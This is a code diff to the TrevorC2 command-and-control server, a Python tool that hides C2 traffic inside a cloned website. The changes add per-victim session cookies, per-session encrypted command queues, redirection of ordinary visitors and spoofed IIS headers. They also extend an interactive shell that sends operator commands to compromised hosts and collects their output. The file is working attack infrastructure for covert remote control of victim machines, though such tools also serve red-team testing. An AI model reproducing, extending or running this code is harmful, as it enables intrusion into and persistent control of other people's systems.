@@ -25,15 +25,27 @@ SITE_PATH_QUERY = ("/images")
 # THIS IS THE QUERY STRING PARAMETER USED
 QUERY_STRING = ("guid=")
 
+# THIS IS THE NAME USED IN THE COOKIE FOR THE COMMUNICATION SESSIONID
+COOKIE_SESSIONID_STRING = ("sessionid")
+
+# THIS IS THE LENGTH OF THE COMMUNICATION SESSIONID
+COOKIE_SESSIONID_LENGTH = (15)
+
 # STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
 STUB = ("oldcss=")
 
 # Turn to True for SSL support
 SSL = False
-CERT_FILE = ""  # Your Certificate for SSL
+CERT_FILE = ("")  # Your Certificate for SSL
 
 # THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
 CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")
+
+# Response for website when browsing directories that do not exist if directly going to SITE_PATH_QUERY
+NOTFOUND=("Page not found.")
+
+# Redirect the victim if browsing website to the cloned URL instead of presenting it. ON/OFF
+REDIRECT =("ON")
 
 # DO NOT CHANGE BELOW THIS LINE
 
@@ -54,6 +66,9 @@ import urllib3
 import requests
 import threading
 import subprocess
+import collections
+import string
+import random
 try:
     import tornado.web
     import tornado.ioloop
@@ -91,9 +106,15 @@ except NameError: pass
 
 # used for registering assets
 assets = []
-def register_assets(hostname):
+def register_assets(sessionid,hostname,remoteip):
     global assets
-    assets.append(hostname)
+    asset = {'sessionid': sessionid, 'hostname': hostname, 'remoteip' : remoteip}
+    assets.append(asset)
+
+def randomString():
+    """Generate a random string of fixed length """
+    letters = string.ascii_letters
+    return ''.join(random.choice(letters) for i in range(COOKIE_SESSIONID_LENGTH))
 
 # AESCipher Library Python2/3 support - http://depado.markdownblog.com/2015-05-11-aes-cipher-with-python-3-x
 class AESCipher(object):
@@ -133,6 +154,11 @@ class AESCipher(object):
 
 # add cipher key here
 cipher = AESCipher(key=CIPHER)
+
+instructionsdict = {}
+def set_instruction(sessionid,instruction):
+    instruction_enc = cipher.encrypt(instruction.encode())
+    instructionsdict[sessionid] = instruction_enc
 
 def htc(m):
     """Decode URL for Postbacks."""
@@ -191,9 +217,29 @@ class UnknownPageHandler(tornado.web.RequestHandler):
         remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
         log.warning('Request to Invalid Page from {}'.format(remote_ip))
         self.set_header('Server', 'IIS')
-        self.write('{"status": "ERROR: Unknown API Endpoint."}\n')
+        if REDIRECT.lower() == ("on"):
+            self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (URL))
+        else:
+            site_data = open("clone_site/index.html", "r").read()
+            self.write(site_data)
+            #self.write('{"status": "ERROR: Unknown API Endpoint."}\n')
         return
 
+    def put(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Invalid request type PUT identified {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        return
+
+    def post(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Invalid request type POST identified {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        return
 
 class RPQ(tornado.web.RequestHandler):
     """Output IP address and close."""
@@ -205,10 +251,35 @@ class RPQ(tornado.web.RequestHandler):
         log.warning('Request to C2 Request Handler from {}'.format(remote_ip))
         self.set_header('Server', 'IIS')
         site_data = open("clone_site/index.html", "r").read()
-        instructions = str(open("clone_site/instructions.txt", "r").read())
-        site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (STUB, instructions))
-        self.write(str(site_data))
+        if self.get_cookie(COOKIE_SESSIONID_STRING):
+            sid = self.get_cookie(COOKIE_SESSIONID_STRING)
+            instructions = instructionsdict[sid]
+        else:
+            instructions = ("")
+            print("[!] Somebody without a cookie accessed the website from {}".format(remote_ip))
 
+        # If we want to redirect them to the site we cloned instead of showing them a cloned copy of the site
+        if REDIRECT.lower() == ("on"):
+            self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (URL))
+        else:
+            site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (STUB, instructions))
+            self.write(str(site_data))
+
+    def put(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Invalid request type PUT identified {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        return
+
+    def post(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Invalid request type POST identified {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        return
 
 class SPQ(tornado.web.RequestHandler):
     """Output IP address and close."""
@@ -219,13 +290,21 @@ class SPQ(tornado.web.RequestHandler):
         remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
         log.warning('Request to C2 Response Handler from {}'.format(remote_ip))
         self.set_header('Server', 'IIS')
+
         args = self.request.arguments
         if not args:
-            self.write('CACHE: FILE NOT FOUND\r\n')
+            self.write('%s\r\n' % (NOTFOUND))
             return
         for param in args:
             if param in (QUERY_STRING):
                 query = args[param][0]
+        if not self.get_cookie(COOKIE_SESSIONID_STRING):
+            sid = randomString()
+            self.set_cookie(COOKIE_SESSIONID_STRING, sid)
+        else:
+            sid = self.get_cookie(COOKIE_SESSIONID_STRING)
+        if not sid:
+            return
         if not query:
             return
         query = base64.b64decode(query)
@@ -234,18 +313,15 @@ class SPQ(tornado.web.RequestHandler):
         # register hostnames
         if "magic_hostname=" in query_output:
             hostname = query_output.split("=")[1]
-            register_assets(hostname + ":" + remote_ip)
-            print("\n*** Received connection from {} and hostname {} for TrevorC2.".format(remote_ip, hostname))
-
+            register_assets(sid,hostname,remote_ip)
+            set_instruction(sid,"nothing")
+            print("\n*** Received connection from {} and hostname {} with communication sid {} for TrevorC2.".format(remote_ip, hostname,sid))
         else:
             hostname = query_output.split("::::")[0]
             data = query_output.split("::::")[1]
-            with open("clone_site/received.txt", "w") as fh:
+            with open("clone_site/received_" + sid + ".txt", "w") as fh:
                 fh.write('=-=-=-=-=-=-=-=-=-=-=\n(HOSTNAME: {}\nCLIENT: {})\n{}'.format(hostname, remote_ip, str(data)))
-
-            with open("clone_site/instructions.txt", "w") as fh:
-                no_instructions = cipher.encrypt("nothing".encode())
-                fh.write(no_instructions)
+            set_instruction(sid,"nothing")
 
 def main_c2():
     """Start C2 Server."""
@@ -328,11 +404,6 @@ if __name__ == "__main__":
     print('[*] Starting Trevor C2 Server...')
     threading.Thread(target=main_c2).start()
 
-    # here we say no instructions to the client
-    with open("clone_site/instructions.txt", "w") as fh:
-        no_instructions = cipher.encrypt("nothing".encode())
-        fh.write(no_instructions)
-
     print("[*] Next, enter the command you want the victim to execute.")
     print("[*] Client uses random intervals, this may take a few.")
     print("[*] Type help for usage. Example commands, list, interact.\n")
@@ -353,11 +424,10 @@ if __name__ == "__main__":
                 if assets == []:
                     print("No available TrevorC2 shells.")
                 else:
-                    print("Format: <session_id> <hostname>:<ipaddress>\n")
-                    for asset in assets:
+                    print("Format: <session_id> <hostname>:<ipaddress>:<communication_sessionid>\n")
+                    for a in assets:
                         counter = counter + 1
-                        print(str(counter) + ". " + asset + " (Trevor C2 Established)")
-
+                        print(str(counter) + ". " + a['hostname'] + " " + a['remoteip'] + " " + a['sessionid']  + " (Trevor C2 Established)")
                 print("\n")
 
             if task == "interact": print("[!] Correct usage: interact <session_id>")
@@ -374,34 +444,41 @@ if __name__ == "__main__":
 
             if "interact " in task:
                 if assets != []:
-                    hostname_select = task.split(" ")[1]
-                    hostname_select = int(hostname_select) - 1
-                    hostname = assets[hostname_select]
-                    hostname = hostname.split(":")[0]
-                    print("[*] Dropping into trevorc2 shell...")
-                    print("[*] Use exit or back to select other shells")
-                    while 1:
-                        task = input(hostname + ":trevorc2>")
-                        if task == "quit" or task == "exit" or task == "back": break
-                        task = (hostname + "::::" + task)
-                        task_out = cipher.encrypt(task.encode())
-                        with open("clone_site/instructions.txt", "w") as fh:
-                            fh.write(task_out)
-                        print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
-                        while 1:
-                            # we received a hit with our command
-                            if os.path.isfile("clone_site/received.txt"):
-                                data = open("clone_site/received.txt", "r").read()
-                                print("[*] Received response back from client...")
-                                print(data)
-                                # remove this so we don't use it anymore
-                                os.remove("clone_site/received.txt")
-                                break
-                            time.sleep(.3)
-                
+                    hostname_sessionid = task.split(" ")[1]
+                    try:
+                        hostname_select = int(hostname_sessionid) - 1
+                    except ValueError:
+                        hostname_select = hostname_sessionid
+                    if isinstance(hostname_select, int):
+                        if (hostname_select < len(assets)) and (hostname_select > -1):
+                            hostname = assets[hostname_select]['hostname']
+                            sid = assets[hostname_select]['sessionid']
+                            print("\n*** interact with {} {}.".format(hostname,sid))
+                            print("[*] Dropping into trevorc2 shell...")
+                            print("[*] Use exit or back to select other shells")
+                            while 1:
+                                task = input(hostname + ":trevorc2>")
+                                if task == "quit" or task == "exit" or task == "back": break
+                                task = (hostname + "::::" + task)
+                                set_instruction(sid,task)
+                                print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
+                                while 1:
+                                    # we received a hit with our command
+                                    if os.path.isfile("clone_site/received_" + sid + ".txt"):
+                                        data = open("clone_site/received_" + sid + ".txt", "r").read()
+                                        print("[*] Received response back from client...")
+                                        print(data)
+                                        # remove this so we don't use it anymore
+                                        os.remove("clone_site/received_" + sid + ".txt")
+                                        break
+                                    time.sleep(.3)
+                        else :
+                             print("[!] Session id {} does not exist.".format(hostname_sessionid))
+                    else :
+                         print("[!] Session id {} is not a valid session id.".format(hostname_sessionid))
                 else:
                     print("[!] No sessions have been established to execute commands.")
-                    
+
     # cleanup when using keyboardinterrupt
     except KeyboardInterrupt:
         if os.path.isdir("clone_site/"): shutil.rmtree("clone_site/")
